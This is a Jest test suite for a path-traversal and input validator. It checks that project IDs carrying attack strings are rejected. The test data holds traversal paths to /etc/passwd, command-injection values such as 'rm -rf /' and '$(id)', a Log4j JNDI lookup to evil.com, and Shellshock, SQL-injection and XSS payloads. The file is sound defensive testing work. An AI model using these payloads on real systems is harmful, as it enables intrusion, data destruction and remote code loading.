/**
 * Path Traversal Validator Tests
 *
 * Comprehensive security tests for path traversal protection.
 * Tests cover OWASP Top 10 - A01: Broken Access Control
 * and CWE-22: Improper Limitation of a Pathname.
 */

import { describe, it, expect } from '@jest/globals';
import {
  validateProjectId,
  validateProjectIds,
  isPathContained,
  sanitizeProjectIdForPath,
  runSecurityAudit,
  getSecurityTestCases,
} from '../path-traversal-validator';
import path from 'path';

describe('Path Traversal Validator - Security Tests', () => {
  describe('validateProjectId - Path Traversal Protection', () => {
    /**
     * Test: Parent directory traversal (Unix)
     * Attack: "../../etc/passwd"
     * Expected: BLOCK
     */
    it('should block Unix parent directory traversal (../)', () => {
      const result = validateProjectId('../../etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
      expect(result.error).toBe('Invalid project ID');
    });

    /**
     * Test: Parent directory traversal (Windows)
     * Attack: "..\\..\\windows\\system32"
     * Expected: BLOCK
     */
    it('should block Windows parent directory traversal (..\\)', () => {
      const result = validateProjectId('..\\..\\windows\\system32');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Multi-level traversal
     * Attack: "../../../etc/passwd"
     * Expected: BLOCK
     */
    it('should block multi-level path traversal', () => {
      const result = validateProjectId('../../../etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Mixed traversal attempts
     * Attack: "./test/../../etc"
     * Expected: BLOCK
     */
    it('should block mixed current and parent directory traversal', () => {
      const result = validateProjectId('./test/../../etc');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Evasion attempt with extra dots
     * Attack: "....//"
     * Expected: BLOCK
     */
    it('should block evasion attempts with extra dots', () => {
      const result = validateProjectId('....//');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  describe('validateProjectId - Absolute Path Protection', () => {
    /**
     * Test: Unix absolute path
     * Attack: "/etc/passwd"
     * Expected: BLOCK
     */
    it('should block Unix absolute paths', () => {
      const result = validateProjectId('/etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Windows absolute path (backslash)
     * Attack: "C:\\Windows\\System32"
     * Expected: BLOCK
     */
    it('should block Windows absolute paths with backslash', () => {
      const result = validateProjectId('C:\\Windows\\System32');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Windows absolute path (forward slash)
     * Attack: "C:/Windows/System32"
     * Expected: BLOCK
     */
    it('should block Windows absolute paths with forward slash', () => {
      const result = validateProjectId('C:/Windows/System32');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Windows drive letter
     * Attack: "C:"
     * Expected: BLOCK
     */
    it('should block Windows drive letters', () => {
      const result = validateProjectId('C:');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: UNC path (Universal Naming Convention)
     * Attack: "\\\\server\\share"
     * Expected: BLOCK
     */
    it('should block UNC paths', () => {
      const result = validateProjectId('\\\\server\\share');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  describe('validateProjectId - Null Byte Injection Protection', () => {
    /**
     * Test: Null byte injection
     * Attack: "test\x00.txt"
     * Expected: BLOCK
     */
    it('should block null byte injection', () => {
      const result = validateProjectId('test\x00.txt');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Null byte bypass attempt
     * Attack: "../../etc/passwd\x00.png"
     * Expected: BLOCK
     */
    it('should block null byte bypass attempts', () => {
      const result = validateProjectId('../../etc/passwd\x00.png');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  describe('validateProjectId - URL Encoding Protection', () => {
    /**
     * Test: URL-encoded parent directory
     * Attack: "%2e%2e%2f" (../)
     * Expected: BLOCK
     */
    it('should block URL-encoded parent directory', () => {
      const result = validateProjectId('%2e%2e%2f');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: URL-encoded Windows parent directory
     * Attack: "%2e%2e%5c" (..\)
     * Expected: BLOCK
     */
    it('should block URL-encoded Windows parent directory', () => {
      const result = validateProjectId('%2e%2e%5c');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Double-encoded traversal
     * Attack: "..%252f"
     * Expected: BLOCK
     */
    it('should block double-encoded traversal attempts', () => {
      const result = validateProjectId('..%252f');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  describe('validateProjectId - Unicode Evasion Protection', () => {
    /**
     * Test: Unicode parent directory
     * Attack: "\u002e\u002e\u002f" (../)
     * Expected: BLOCK
     */
    it('should block Unicode evasion attempts', () => {
      const result = validateProjectId('\u002e\u002e\u002f');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  describe('validateProjectId - Reserved Names Protection', () => {
    /**
     * Test: Windows reserved device names
     * Attack: "CON", "PRN", "AUX", "NUL", "COM1", "LPT1"
     * Expected: BLOCK
     */
    it('should block Windows reserved device names', () => {
      const reservedNames = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1', 'COM9', 'LPT9'];

      for (const name of reservedNames) {
        const result = validateProjectId(name);
        expect(result.valid).toBe(false);
        expect(result.sanitized).toBeUndefined();
      }
    });

    /**
     * Test: Case-insensitive reserved name check
     * Attack: "con", "Con", "CON"
     * Expected: BLOCK all variants
     */
    it('should block reserved names case-insensitively', () => {
      const variants = ['con', 'Con', 'CON', 'cOn'];

      for (const variant of variants) {
        const result = validateProjectId(variant);
        expect(result.valid).toBe(false);
      }
    });
  });

  describe('validateProjectId - Special Character Protection', () => {
    /**
     * Test: XSS attempt
     * Attack: "project<script>"
     * Expected: BLOCK
     */
    it('should block script injection attempts', () => {
      const result = validateProjectId('project<script>alert("xss")</script>');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Command injection
     * Attack: "project; rm -rf /"
     * Expected: BLOCK
     */
    it('should block command injection attempts', () => {
      const result = validateProjectId('project; rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Backtick injection
     * Attack: "project`whoami`"
     * Expected: BLOCK
     */
    it('should block backtick injection attempts', () => {
      const result = validateProjectId('project`whoami`');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Command substitution
     * Attack: "project$(id)"
     * Expected: BLOCK
     */
    it('should block command substitution attempts', () => {
      const result = validateProjectId('project$(id)');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Pipe character
     * Attack: "project|evil"
     * Expected: BLOCK
     */
    it('should block pipe character', () => {
      const result = validateProjectId('project|evil');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Redirection characters
     * Attack: "project>file", "project<file"
     * Expected: BLOCK
     */
    it('should block redirection characters', () => {
      const result1 = validateProjectId('project>file');
      const result2 = validateProjectId('project<file');

      expect(result1.valid).toBe(false);
      expect(result2.valid).toBe(false);
    });
  });

  describe('validateProjectId - Length Validation', () => {
    /**
     * Test: Empty string
     * Expected: BLOCK
     */
    it('should block empty strings', () => {
      const result = validateProjectId('');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Whitespace only
     * Expected: BLOCK
     */
    it('should block whitespace-only strings', () => {
      const result = validateProjectId('   ');
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Excessively long ID (DoS protection)
     * Attack: 101 characters
     * Expected: BLOCK
     */
    it('should block excessively long IDs', () => {
      const longId = 'a'.repeat(101);
      const result = validateProjectId(longId);
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    /**
     * Test: Maximum allowed length
     * Expected: PASS
     */
    it('should accept maximum allowed length (100 chars)', () => {
      const maxId = 'a'.repeat(100);
      const result = validateProjectId(maxId);
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe(maxId);
    });
  });

  describe('validateProjectId - Type Validation', () => {
    /**
     * Test: Non-string input
     * Expected: BLOCK
     */
    it('should block non-string inputs', () => {
      const numberResult = validateProjectId(123 as unknown as string);
      const nullResult = validateProjectId(null as unknown as string);
      const undefinedResult = validateProjectId(undefined as unknown as string);
      const objectResult = validateProjectId({} as unknown as string);

      expect(numberResult.valid).toBe(false);
      expect(nullResult.valid).toBe(false);
      expect(undefinedResult.valid).toBe(false);
      expect(objectResult.valid).toBe(false);
    });
  });

  describe('validateProjectId - Valid IDs', () => {
    /**
     * Test: Reserved demo project
     * Expected: PASS
     */
    it('should accept reserved demo project ID', () => {
      const result = validateProjectId('demo');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('demo');
    });

    /**
     * Test: Simple alphanumeric ID
     * Expected: PASS
     */
    it('should accept simple alphanumeric IDs', () => {
      const result = validateProjectId('my-project-123');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('my-project-123');
    });

    /**
     * Test: ID with underscores
     * Expected: PASS
     */
    it('should accept IDs with underscores', () => {
      const result = validateProjectId('project_abc');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('project_abc');
    });

    /**
     * Test: UUID v4 format
     * Expected: PASS
     */
    it('should accept UUID v4 format IDs', () => {
      const uuid = '550e8400-e29b-41d4-a716-446655440000';
      const result = validateProjectId(uuid);
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe(uuid);
    });

    /**
     * Test: Dot notation
     * Expected: PASS
     */
    it('should accept dot notation in IDs', () => {
      const result = validateProjectId('project.test.name');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('project.test.name');
    });

    /**
     * Test: Mixed case with hyphen
     * Expected: PASS
     */
    it('should accept mixed case with hyphens', () => {
      const result = validateProjectId('MyProject-2024');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('MyProject-2024');
    });

    /**
     * Test: Leading/trailing whitespace trimmed
     * Expected: PASS with trimmed value
     */
    it('should trim leading and trailing whitespace', () => {
      const result = validateProjectId('  my-project  ');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('my-project');
    });
  });

  describe('validateProjectIds - Batch Validation', () => {
    it('should validate multiple IDs correctly', () => {
      const ids = [
        'valid-project',
        '../../etc/passwd',
        'another-valid',
        'C:\\Windows\\System32',
        'demo',
      ];

      const result = validateProjectIds(ids);

      expect(result.valid).toEqual(['valid-project', 'another-valid', 'demo']);
      expect(result.invalid).toEqual(['../../etc/passwd', 'C:\\Windows\\System32']);
      expect(result.errors.size).toBe(2);
      expect(result.errors.get('../../etc/passwd')).toBe('Invalid project ID');
      expect(result.errors.get('C:\\Windows\\System32')).toBe('Invalid project ID');
    });
  });

  describe('isPathContained - Path Containment Check', () => {
    /**
     * Test: Path within base directory
     * Expected: PASS
     */
    it('should return true for paths within base directory', () => {
      const basePath = '/home/user/projects';
      const resolvedPath = '/home/user/projects/my-project/calendar.json';

      const result = isPathContained(resolvedPath, basePath);
      expect(result).toBe(true);
    });

    /**
     * Test: Path outside base directory
     * Expected: FAIL
     */
    it('should return false for paths outside base directory', () => {
      const basePath = '/home/user/projects';
      const resolvedPath = '/home/user/projects-malicious/calendar.json';

      const result = isPathContained(resolvedPath, basePath);
      expect(result).toBe(false);
    });

    /**
     * Test: Exact match
     * Expected: PASS
     */
    it('should return true for exact path match', () => {
      const basePath = '/home/user/projects';
      const resolvedPath = '/home/user/projects';

      const result = isPathContained(resolvedPath, basePath);
      expect(result).toBe(true);
    });

    /**
     * Test: Traversal outside base
     * Expected: FAIL
     */
    it('should return false for traversal outside base', () => {
      const basePath = '/home/user/projects';
      const resolvedPath = '/home/user/projects/../etc';

      const result = isPathContained(resolvedPath, basePath);
      expect(result).toBe(false);
    });
  });

  describe('sanitizeProjectIdForPath - Sanitization', () => {
    /**
     * Test: Valid ID passes through
     * Expected: PASS
     */
    it('should return valid ID unchanged', () => {
      const result = sanitizeProjectIdForPath('my-project-123');
      expect(result).toBe('my-project-123');
    });

    /**
     * Test: Invalid ID throws error
     * Expected: THROW
     */
    it('should throw error for invalid ID', () => {
      expect(() => {
        sanitizeProjectIdForPath('../../etc/passwd');
      }).toThrow('Invalid project ID');
    });
  });

  describe('Security Audit - Comprehensive Test Suite', () => {
    /**
     * Test: Security audit helper
     * Verifies all test cases are covered
     */
    it('should provide security test cases', () => {
      const testCases = getSecurityTestCases();

      expect(testCases.length).toBeGreaterThan(0);
      expect(testCases.some(tc => tc.description.includes('Path traversal'))).toBe(true);
      expect(testCases.some(tc => tc.description.includes('Absolute path'))).toBe(true);
      expect(testCases.some(tc => tc.description.includes('Null byte'))).toBe(true);
      expect(testCases.some(tc => tc.description.includes('URL-encoded'))).toBe(true);
    });

    /**
     * Test: Run full security audit
     * Verifies validator blocks all attack patterns
     */
    it('should pass all security audit tests', () => {
      const audit = runSecurityAudit();

      // Should have tested multiple scenarios
      expect(audit.totalTests).toBeGreaterThan(20);

      // Should pass valid IDs and block invalid ones
      expect(audit.passed).toBe(audit.totalTests);
      expect(audit.failed).toBe(0);

      // Verify specific attack patterns are blocked
      const traversalTests = audit.results.filter(
        r => r.description.includes('Path traversal') || r.description.includes('Absolute path')
      );

      for (const test of traversalTests) {
        expect(test.passed).toBe(true);
        expect(test.actual).toBe('invalid');
      }

      // Verify valid IDs are accepted
      const validTests = audit.results.filter(r => r.description.includes('(VALID)'));
      for (const test of validTests) {
        expect(test.passed).toBe(true);
        expect(test.actual).toBe('valid');
      }
    });

    /**
     * Test: Detailed audit results
     */
    it('should provide detailed audit results', () => {
      const audit = runSecurityAudit();

      // Each result should have detailed information
      for (const result of audit.results) {
        expect(result).toHaveProperty('input');
        expect(result).toHaveProperty('description');
        expect(result).toHaveProperty('expected');
        expect(result).toHaveProperty('actual');
        expect(result).toHaveProperty('passed');
      }
    });
  });

  describe('Real-World Attack Scenarios', () => {
    /**
     * Test: Log4j-style exploitation attempt
     * Attack: "${jndi:ldap://evil.com/a}"
     * Expected: BLOCK
     */
    it('should block JNDI injection attempts', () => {
      const result = validateProjectId('${jndi:ldap://evil.com/a}');
      expect(result.valid).toBe(false);
    });

    /**
     * Test: Shellshock-style exploitation
     * Attack: "() { :; }; echo vulnerable"
     * Expected: BLOCK
     */
    it('should block shellshock-style attacks', () => {
      const result = validateProjectId('() { :; }; echo vulnerable');
      expect(result.valid).toBe(false);
    });

    /**
     * Test: SQL injection attempt
     * Attack: "project'; DROP TABLE projects; --"
     * Expected: BLOCK
     */
    it('should block SQL injection attempts', () => {
      const result = validateProjectId("project'; DROP TABLE projects; --");
      expect(result.valid).toBe(false);
    });

    /**
     * Test: Template injection
     * Attack: "{{7*7}}" or "${7*7}"
     * Expected: BLOCK
     */
    it('should block template injection attempts', () => {
      const result1 = validateProjectId('{{7*7}}');
      const result2 = validateProjectId('${7*7}');

      expect(result1.valid).toBe(false);
      expect(result2.valid).toBe(false);
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    /**
     * Test: Single character ID
     * Expected: PASS (valid)
     */
    it('should accept single character IDs', () => {
      const result = validateProjectId('a');
      expect(result.valid).toBe(true);
    });

    /**
     * Test: Hyphen at start
     * Expected: PASS (valid)
     */
    it('should accept hyphens at start', () => {
      const result = validateProjectId('-test');
      expect(result.valid).toBe(true);
    });

    /**
     * Test: Hyphen at end
     * Expected: PASS (valid)
     */
    it('should accept hyphens at end', () => {
      const result = validateProjectId('test-');
      expect(result.valid).toBe(true);
    });

    /**
     * Test: Multiple dots
     * Expected: PASS (valid if not path traversal)
     */
    it('should accept multiple dots in valid context', () => {
      const result = validateProjectId('project..test');
      expect(result.valid).toBe(true);
    });

    /**
     * Test: Unicode characters (non-ASCII)
     * Expected: BLOCK
     */
    it('should block non-ASCII Unicode characters', () => {
      const result = validateProjectId('proyecto-café');
      expect(result.valid).toBe(false);
    });

    /**
     * Test: Emoji characters
     * Expected: BLOCK
     */
    it('should block emoji characters', () => {
      const result = validateProjectId('project🚀');
      expect(result.valid).toBe(false);
    });
  });

  describe('Platform-Specific Considerations', () => {
    /**
     * Test: Windows drive letter variations
     * Expected: BLOCK all
     */
    it('should block all Windows drive letter formats', () => {
      const variations = ['C:', 'c:', 'D:', 'd:', 'Z:', 'z:'];

      for (const variant of variations) {
        const result = validateProjectId(variant);
        expect(result.valid).toBe(false);
      }
    });

    /**
     * Test: Windows special filenames
     * Expected: BLOCK
     */
    it('should block Windows special filenames', () => {
      const specialFiles = ['CON', 'PRN', 'AUX', 'CLOCK$', 'NUL',
        'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
        'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'];

      for (const filename of specialFiles) {
        const result = validateProjectId(filename);
        expect(result.valid).toBe(false);
      }
    });
  });
});
